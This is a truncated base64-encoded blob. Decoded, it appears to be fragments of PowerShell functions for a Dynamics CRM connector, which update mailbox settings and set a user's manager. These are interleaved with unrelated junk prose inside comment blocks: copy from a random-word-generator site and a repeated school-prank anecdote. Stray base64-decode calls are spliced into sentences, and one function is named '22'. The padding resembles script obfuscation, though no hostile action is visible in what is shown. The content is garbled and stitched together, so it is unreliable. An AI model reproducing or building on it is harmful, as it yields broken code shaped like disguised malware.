ZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJEZWZhdWx0IildCiAgICAgICAgW3N3aXRjaF0kQXBwbHlEZWZhdWx0RW1haWxTZXR0aW5ncywKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IlN0YXR1cyIpXQogICAgICAgIFtzdHJpbmddJFN0YXRlQ29kZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IlN0YXR1cyIpXQogICAgICAgIFtzdHJpbmddJFN0YXR1c0NvZGUsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTdGF0dXMiKV0KICAgICAgICBbc3dpdGNoXSRTY2hlZHVsZVRlc3QsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTdGF0dXMiKV0KICAgICAgICBbc3dpdGNoXSRNYXJrZWRBc1ByaW1hcnlGb3JFeGNoYW5nZVN5bmMsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJTdGF0dXMiKV0KICAgICAgICBbc3dpdGNoXSRBcHByb3ZlRW1haWwKICAgICkKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKICAgICRmZXRjaCA9IEAiCiAgICA8ZmV0Y2ggdmVyc2lvbj0iMS4wIiBvdXRwdXQtZm9ybWF0PSJ4bWwtcGxhdGZvcm0iIG1hcHBpbmc9ImxvZ2ljYWwiIGRpc3RpbmN0PSJmYWxzZSIgbm8tbG9jaz0idHJ1ZSI+CiAgICAgIDxlbnRpdHkgbmFtZT0ibWFpbGJveCI+CiAgICAgICAgPGF0dHJpYnV0ZSBuYW1lPSJtYWlsYm94aWQiIC8+CiAgICAgICAgPGZpbHRlciB0eXBlPSJhbmQiPgogICAgICAgICAgPGNvbmRpdGlvbiBhdHRyaWJ1dGU9InJlZ2FyZGluZ29iamVjdGlkIiBvcGVyYXRvcj0iZXEiIHZhbHVlPSJ7JFF1ZXVlSWR9IiAvPgogICAgICAgIDwvZmlsdGVyPgogICAgICA8L2VudGl0eT4KICAgIDwvZmV0Y2g+CiJACgogICAgJElkID0gKEdldC1Dcm1SZWNvcmRzQnlGZXRjaCAtY29ubiAkY29ubiAtRmV0Y2ggJGZldGNoKS5Dcm1SZWNvcmRzWzBdLk1haWxib3hJZAogICAgCiAgICAkdXBkYXRlRmllbGRzID0gQHt9CiAgICBpZigkQXBwbHlEZWZhdWx0RW1haWxTZXR0aW5ncykKICAgIHsKICAgICAgICAkZmV0Y2ggPSBAIgogICAgICAgIDxmZXRjaCB2ZXJzaW9uPSIxLjAiIG91dHB1dC1mb3JtYXQ9InhtbC1wbGF0Zm9ybSIgbWFwcGluZz0ibG9naWNhbCIgZGlzdGluY3Q9ImZhbHNlIiBuby1sb2NrPSJ0cnVlIj4KICAgICAgICAgICAgPGVudGl0eSBuYW1lPSJvcmdhbml6YXRpb24iPgogICAgICAgICAgICAgICAgPGF0dHJpYnV0ZSBuYW1lPSJkZWZhdWx0ZW1haWxzZXJ2ZXJwcm9maWxlaWQiIC8+ICAgICAgIAogICAgICAgICAgICAgICAgPGF0dHJpYnV0ZSBuYW1lPSJkZWZhdWx0ZW1haWxzZXR0aW5ncyIgLz4gICAgICAgICAgICAKICAgICAgICAgICAgPC9lbnRpdHk+CiAgICAgICAgPC9mZXRjaD4KIkAKICAgICAgICAkcmVjb3JkID0gKEdldC1Dcm1SZWNvcmRzQnlGZXRjaCAtY29ubiAkY29ubiAtRmV0Y2ggJGZldGNoKS5Dcm1SZWNvcmRzWzBdCiAgICAgICAgJHVwZGF0ZUZpZWxkcy5BZGQoImVtYWlsc2VydmVycHJvZmlsZSIsICRyZWNvcmQuZGVmYXVsdGVtYWlsc2VydmVycHJvZmlsZWlkX1Byb3BlcnR5LlZhbHVlKQogICAgICAgICR4bWwgPSBbeG1sXSRyZWNvcmQuZGVmYXVsdGVtYWlsc2V0dGluZ3MKICAgICAgICAkdXBkYXRlRmllbGRzLkFkZCgiaW5jb21pbmdlbWFpbGRlbGl2ZXJ5bWV0aG9kIiwgKE5ldy1Dcm1PcHRpb25TZXRWYWx1ZSAkeG1sLkNoaWxkTm9kZXMuSW5jb21pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kKSkKICAgICAgICAkdXBkYXRlRmllbGRzLkFkZCgib3V0Z29pbmdlbWFpbGRlbGl2ZXJ5bWV0aG9kIiwgKE5ldy1Dcm1PcHRpb25TZXRWYWx1ZSAkeG1sLkNoaWxkTm9kZXMuT3V0Z29pbmdFbWFpbERlbGl2ZXJ5TWV0aG9kKSkKICAgIH0KICAgIGlmKCRTY2hlZHVsZVRlc3QpCiAgICB7CiAgICAgICAgJHVwZGF0ZUZpZWxkcy5BZGQoInRlc3RlbWFpbGNvbmZpZ3VyYXRpb25zY2hlZHVsZWQiLCAkdHJ1ZSkKICAgIH0KICAgIGlmKCRNYXJrZWRBc1ByaW1hcnlGb3JFeGNoYW5nZVN5bmMpCiAgICB7CiAgICAgICAgJHVwZGF0ZUZpZWxkcy5BZGQoIm9yZ21hcmtlZGFzcHJpbWFyeWZvcmV4Y2hhbmdlc3luYyIsICR0cnVlKQogICAgfQogICAgaWYoJEFwcHJvdmVFbWFpbCkKICAgIHsKICAgICAgICBBcHByb3ZlLUNybUVtYWlsQWRkcmVzcyAtY29ubiAkY29ubiAtUXVldWVJZCAkUXVldWVJZAogICAgfQoJCiAgICBmb3JlYWNoKCRwYXJhbWV0ZXIgaW4gJE15SW52b2NhdGlvbi5Cb3VuZFBhcmFtZXRlcnMuR2V0RW51bWVyYXRvcigpKQogICAgeyAgIAogICAgICAgIGlmKCRwYXJhbWV0ZXIuS2V5IC1pbiAoIkVtYWlsU2VydmVyUHJvZmlsZSIpKQogICAgICAgIHsKICAgICAgICAgICAgJHVwZGF0ZUZpZWxkcy5BZGQoJHBhcmFtZXRlci5LZXkuVG9Mb3dlcigpLCAoTmV3LUNybUVudGl0eVJlZmVyZW5jZSBlbWFpbHNlcnZlcnByb2ZpbGUgJHBhcmFtZXRlci5WYWx1ZSkpCiAgICAgICAgfQogICAgICAgIGVsc2VpZigkcGFyYW1ldGVyLktleSAtaW4gKCJJbmNvbWluZ0VtYWlsRGVsaXZlcnlNZXRob2QiLCJPdXRnb2luZ0VtYWlsRGVsaXZlcnlNZXRob2QiKSkKICAgICAgICB7CiAgICAgICAgICAgICR1cGRhdGVGaWVsZHMuQWRkKCRwYXJhbWV0ZXIuS2V5LlRvTG93ZXIoKSwgKE5ldy1Dcm1PcHRpb25TZXRWYWx1ZSAkcGFyYW1ldGVyLlZhbHVlKSkKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCRwYXJhbWV0ZXIuS2V5IC1pbiAoIlN0YXRlQ29kZSIsIlN0YXR1c0NvZGUiKSkKICAgICAgICB7CiAgICAgICAgICAgIFNldC1Dcm1SZWNvcmRTdGF0ZSAtY29ubiAkY29ubiAtRW50aXR5TG9naWNhbE5hbWUgbWFpbGJveCAtSWQgJElkIC1TdGF0ZUNvZGUgJFN0YXRlQ29kZSAtU3RhdHVzQ29kZSAkU3RhdHVzQ29kZQogICAgICAgIH0KICAgICAgICBlbHNlaWYoJHBhcmFtZXRlci5LZXkgLWluICgiRW1haWxBZGRyZXNzIikpCiAgICAgICAgewogICAgICAgICAgICAkdXBkYXRlRmllbGRzLkFkZCgkcGFyYW1ldGVyLktleS5Ub0xvd2VyKCksICRwYXJhbWV0ZXIuVmFsdWUpCiAgICAgICAgfQogICAgfQogICAgCiAgICBTZXQtQ3JtUmVjb3JkIC1jb25uICRjb25uIC1FbnRpdHlMb2dpY2FsTmFtZSBtYWlsYm94IC1JZCAkSWQgLUZpZWxkcyAkdXBkYXRlRmllbGRzCn0KPCM+PgpTcD1lbGxpbmcgYW5kIGQoKQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSBkKCkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGYoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgRGVkaWNhdGlvblNvdXJjZSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiAyMnsKCgogW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKCAKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEpXQogICAgICAgIFtndWlkXSRVc2VySWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIpXQogICAgICAgIFtndWlkXSRNYW5hZ2VySWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTMpXQogICAgICAgIFtib29sXSRLZWVwQ2hpbGRVc2VycwogICAgKQoKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKCiAgICAkcmVxdWVzdCA9IE5ldy1PYmplY3QgJ01pY3Jvc29mdC5Dcm0uU2RrLk1lc3NhZ2VzLlNldFBhcmVudFN5c3RlbVVzZXJSZXF1ZXN0JwogICAgJHJlcXVlc3QuUGFyZW50SWQgPSAkTWFuYWdlcklkCiAgICAkcmVxdWVzdC5Vc2VySWQgPSAkVXNlcklkCiAgICAkcmVxdWVzdC5LZWVwQ2hpbGRVc2VycyA9ICRLZWVwQ2hpbGRVc2VycwoKICAgIHRyeQogICAgewogICAgICAgICRyZXN1bHQgPSAkY29ubi5FeGVjdXRlQ3JtT3JnYW5pemF0aW9uUmVxdWVzdCgkcmVxdWVzdCwgJG51bGwpCgkJaWYoJHJlc3VsdCAtZXEgJG51bGwpCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyBMYXN0Q3JtQ29ubmVjdG9yRXhjZXB0aW9uKCRjb25uKQogICAgICAgIH0KICAgIH0KICAgIGNhdGNoCiAgICB7CiAgICAgICAgdGhyb3cgTGFzdENybUNvbm5lY3RvckV4Y2VwdGlvbigkY29ubikKICAgIH0gCn0KPCM+PgpTcD1lbGxpbmcgYW5kIGQoKQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSBkKCkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvd